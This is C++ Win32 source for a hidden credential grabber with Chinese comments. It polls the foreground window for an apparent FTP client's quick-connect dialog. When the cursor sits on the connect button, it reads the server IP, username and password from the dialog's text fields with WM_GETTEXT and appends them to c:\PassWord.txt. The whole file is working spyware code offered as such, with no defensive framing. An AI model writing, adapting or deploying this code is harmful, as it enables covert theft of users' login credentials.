// PostMessage.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>

int DataToFile( char *buff ) 
{ 
	//调用CreateFile函数以只写方式打开一个文件
	HANDLE hFile=CreateFile("c:\\PassWord.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//调用SetFilePointer函数调整文件指针位置，移动到文件末尾
	if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error \n");	
		return 0;	
	}
	DWORD dwWrite;
	//把buff中的内容写入到文件末尾
	if(!WriteFile(hFile,buff,strlen(buff),&dwWrite,NULL))
	{
		printf("WriteFile error \n");	
		return 0;	
	}
	CloseHandle(hFile);
	return 0;
} 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char PassWord[80]={0};
	char ServerIp[80]={0};
	char UserName[80]={0};
	char BackUserName[80]={0};
	//循环监控
	while(TRUE)
	{
		HWND hwnd;
		char ClassName[255];
		//得到当前活动窗口句柄
		hwnd=GetForegroundWindow();
		//得到当前活动窗口类名
		GetClassName(hwnd,ClassName,255);
		//判断是否是快速连接窗口
		if(strcmp(ClassName,"TfrmQuick")==0)
		{
			char ButtonName[80]={0};
			tagPOINT lpPoint;
			//得到鼠标当前坐标
			GetCursorPos(&lpPoint);
			//得到当前坐标所在窗体的句柄
			hwnd=WindowFromPoint(lpPoint);
			if(hwnd==NULL)
				continue;
			//发送WM_GETTEXT消息，得到窗体文本
			SendMessage(hwnd,WM_GETTEXT,80,(LPARAM)ButtonName);
			//假如文本内容为“连接”则说明鼠标光标在连接按钮上了
			if(strcmp(ButtonName,"连接")!=0)
				continue;
			hwnd=FindWindowEx(NULL,NULL,"TfrmQuick","快速连接");
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TPageControl",NULL);
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TTabSheet","常规");
			if(hwnd==NULL)
				continue;
			HWND hFirst=FindWindowEx(hwnd,NULL,"TEdit",NULL);
			if(hFirst==NULL)
				continue;
			//得到服务器IP
			SendMessage(hFirst,WM_GETTEXT,80,(LPARAM)ServerIp);
			HWND hNext=FindWindowEx(hwnd,hFirst,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//得到密码
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)PassWord);
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//得到用户名
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)UserName);
			//和上一次的记录的用户名比较，防止重复记录
			if(strcmp(BackUserName,UserName)==0)
				continue;
			//备份用户名
			strcpy(BackUserName,UserName);
			char Data[512]={0};
			//格式化数据
			wsprintf(Data,"\r\n服务器IP：%s\r\n用户名：%s\r\n密码：%s\r\n",ServerIp,UserName,PassWord);
			//写入文件
			DataToFile(Data);	
		}
		Sleep(500);
	}
	return 0;
}



